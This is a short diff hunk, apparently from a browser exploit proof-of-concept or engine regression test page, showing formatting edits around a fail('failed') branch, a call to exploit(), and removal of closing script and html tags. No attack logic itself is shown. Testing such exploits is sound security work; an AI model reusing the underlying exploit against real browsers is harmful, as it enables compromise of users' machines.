@@ -1019,9 +891,6 @@ function foo(obj) {
     } else {
         fail("failed");
     }
-    }
-
+}
 exploit();
-
 </script>
-</html>
